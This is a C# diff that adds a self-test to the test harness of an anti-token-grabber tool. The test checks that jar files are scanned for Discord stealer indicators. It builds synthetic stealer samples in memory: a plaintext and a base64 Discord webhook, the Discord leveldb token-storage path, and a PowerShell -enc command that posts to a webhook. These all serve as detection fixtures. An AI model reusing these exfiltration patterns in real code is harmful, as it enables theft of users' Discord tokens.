@@ -11,6 +11,7 @@ const string ReassemblySelfTestScenario = "tls-reassembly-selftest";
 const string QuicCryptoSelfTestScenario = "quic-crypto-selftest";
 const string QuicHeaderSelfTestScenario = "quic-header-selftest";
 const string QuicWiringSelfTestScenario = "quic-wiring-selftest";
+const string JarScanSelfTestScenario = "jar-scan-selftest";
 
 var scenarios = new Dictionary<string, ScenarioDefinition>(StringComparer.OrdinalIgnoreCase)
 {
@@ -23,7 +24,7 @@ if (!options.TestMode)
 {
     Console.Error.WriteLine("Recusado: TestHarness só roda com --test-mode.");
     Console.Error.WriteLine("Uso: AntiGrabber.TestHarness --test-mode --scenario=<cenario> [--webhook-url=<url-de-teste>]");
-    Console.Error.WriteLine($"Cenários disponíveis: {string.Join(", ", scenarios.Keys)}, {TlsParserSelfTestScenario}, {ReassemblySelfTestScenario}, {QuicCryptoSelfTestScenario}, {QuicHeaderSelfTestScenario}, {QuicWiringSelfTestScenario} (sem rede)");
+    Console.Error.WriteLine($"Cenários disponíveis: {string.Join(", ", scenarios.Keys)}, {TlsParserSelfTestScenario}, {ReassemblySelfTestScenario}, {QuicCryptoSelfTestScenario}, {QuicHeaderSelfTestScenario}, {QuicWiringSelfTestScenario}, {JarScanSelfTestScenario} (sem rede)");
     return 2;
 }
 
@@ -58,6 +59,19 @@ if (string.Equals(options.Scenario, QuicCryptoSelfTestScenario, StringComparison
     try
     {
         return RunQuicCryptoSelfTest();
+    }
+    catch (Exception ex)
+    {
+        Console.Error.WriteLine(ex.Message);
+        return 1;
+    }
+}
+
+if (string.Equals(options.Scenario, JarScanSelfTestScenario, StringComparison.OrdinalIgnoreCase))
+{
+    try
+    {
+        return RunJarScanSelfTest();
     }
     catch (Exception ex)
     {
@@ -527,6 +541,78 @@ static byte[] Rfc9001SampleClientInitialPacket() => Convert.FromHexString(
     "056df31bd267b6b90a079831aaf579be0a39013137aac6d404f518cfd4684064" +
     "7e78bfe706ca4cf5e9c5453e9f7cfd2b8b4c8d169a44e55c88d4a9a7f9474241" +
     "e221af44860018ab0856972e194cd934");
+
+// Self-check do BlockInvestigator — sem rede, sem processo real. Jars sintéticos em
+// memória: um stealer (webhook em claro, webhook em base64, caminho de token num
+// jar-in-jar) tem que ser apontado com a string EXATA e o arquivo de origem; um mod
+// legítimo com strings parecidas (convite do Discord, rickroll do YouTube, API do Rich
+// Presence) não pode gerar falso positivo.
+static int RunJarScanSelfTest()
+{
+    const string webhook = "https://discord.com/api/webhooks/123456/TEST_NAO_E_REAL-x_y";
+    const string b64Webhook = "https://discordapp.com/api/webhooks/9/abc";
+    var nested = BuildJar(("x/Grab.class", "\u0001\u0000\u0035" + @"C:\Users\a\AppData\Roaming\discord\Local Storage\leveldb" + "\u0001\u0000"));
+    var stealer = BuildJar(
+        ("fabric.mod.json", "{\"id\":\"coolmod\",\"name\":\"Cool Mod\",\"version\":\"1.2.3\"}"),
+        // \u0001 + 2 bytes de tamanho, como no constant pool de um .class (0x35 = '5', imprimível)
+        ("a/B.class", "\u0001\u0000\u0035" + webhook + "\u0001\u0000\u0004Code"),
+        ("c/D.class", "\u0001\u0000\u0038" + Convert.ToBase64String(Encoding.ASCII.GetBytes(b64Webhook)) + "\u0001"),
+        ("META-INF/jars/inner.jar", Encoding.Latin1.GetString(nested)));
+    var (hits, mod) = BlockInvestigator.ScanJar(new MemoryStream(stealer));
+    string Dump() => string.Join(" | ", hits.Select(h => $"{h.Label} @ {h.Entry}: {h.Match} => {h.Decoded}"));
+
+    Assert(hits.Any(h => h.Label == "URL de webhook do Discord" && h.Match == webhook && h.Entry == "a/B.class"),
+        $"webhook em claro não veio exato: {Dump()}");
+    Assert(hits.Any(h => h.Label == "URL de webhook do Discord em base64" && h.Decoded == b64Webhook && h.Entry == "c/D.class"),
+        $"webhook em base64 não foi decodificado exato: {Dump()}");
+    Assert(hits.Any(h => h.Label == "caminho de token do Discord" && h.Entry == "META-INF/jars/inner.jar!/x/Grab.class"
+            && h.Match == @"C:\Users\a\AppData\Roaming\discord\Local Storage\leveldb"),
+        $"caminho de token em jar-in-jar sem origem/trecho corretos: {Dump()}");
+    Assert(mod is { Id: "coolmod", Name: "Cool Mod", Version: "1.2.3" }, $"metadados do mod errados: {mod}");
+
+    var legit = BuildJar(
+        ("fabric.mod.json", "{\"contact\":{\"discord\":\"https://discord.com/invite/WKAR27SdSv\"}}"),
+        ("m/MediaButton.class", "https://www.youtube.com/watch?v=dQw4w9WgXcQ"),
+        ("cp/DiscordAssetUtils.class", "https://discord.com/api/oauth2/applications/ ptb.discord.com/api"),
+        ("lang/en_us.json", "{\"webhooks\":\"Webhooks\"}"));
+    var (legitHits, _) = BlockInvestigator.ScanJar(new MemoryStream(legit));
+    Assert(legitHits.Count == 0, $"mod legítimo gerou falso positivo: [{string.Join(", ", legitHits.Select(h => h.Label + ": " + h.Match))}]");
+
+    var java = BlockInvestigator.ExtractScanTargets("javaw.exe", new[]
+    {
+        "javaw.exe", @"-Djava.library.path=C:\Prism\instances\X\natives", "-cp", "a.jar;b.jar",
+        "net.fabricmc.loader.impl.launch.knot.KnotClient", "--gameDir", @"C:\Modrinth\profiles\P", "--accessToken", "segredo",
+    });
+    Assert(java.Paths.Contains(Path.Combine(@"C:\Modrinth\profiles\P", "mods")), $"--gameDir não virou pasta de mods: [{string.Join(", ", java.Paths)}]");
+    Assert(java.Paths.Contains(Path.Combine(@"C:\Prism\instances\X", "minecraft", "mods")), $"instância Prism não detectada: [{string.Join(", ", java.Paths)}]");
+    Assert(!java.Paths.Any(t => t.Contains("segredo")) && java.Inline.Count == 0, "accessToken vazou pra lista de alvos");
+    Assert(BlockInvestigator.ExtractScanTargets("java.exe", new[] { "java", "-jar", @"C:\t\app.jar" }).Paths.SequenceEqual(new[] { @"C:\t\app.jar" }), "-jar não detectado");
+
+    Assert(BlockInvestigator.ExtractScanTargets("python.exe", new[] { "python", "-u", @"C:\s\grab.py", "--x" }).Paths.SequenceEqual(new[] { @"C:\s\grab.py" }), "script python não detectado");
+    var encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes($"iwr {webhook} -Method Post"));
+    var ps = BlockInvestigator.ExtractScanTargets("powershell.exe", new[] { "powershell", "-NoP", "-enc", encoded });
+    Assert(ps.Inline.Count == 1 && BlockInvestigator.FindHits(ps.Inline[0].Text, ps.Inline[0].Source).Any(h => h.Match == webhook),
+        "webhook dentro de -EncodedCommand não foi achado");
+
+    Assert(!new DomainWhitelistStore(Path.Combine(Path.GetTempPath(), $"ag-selftest-{Guid.NewGuid()}.json")).AllowAlways("discord.com", "javaw.exe"),
+        "javaw.exe não deveria poder ser liberado só pelo nome");
+
+    Console.WriteLine("PASS — BlockInvestigator: webhook exato (claro/base64 decodificado/-EncodedCommand), origem jar-in-jar, metadados do mod, sem falso positivo, alvos sem vazar token, javaw travado.");
+    return 0;
+}
+
+static byte[] BuildJar(params (string Name, string Content)[] entries)
+{
+    using var ms = new MemoryStream();
+    using (var zip = new System.IO.Compression.ZipArchive(ms, System.IO.Compression.ZipArchiveMode.Create, leaveOpen: true))
+        foreach (var (name, content) in entries)
+        {
+            using var w = zip.CreateEntry(name).Open();
+            var bytes = Encoding.Latin1.GetBytes(content);
+            w.Write(bytes);
+        }
+    return ms.ToArray();
+}
 
 static void Assert(bool condition, string message)
 {
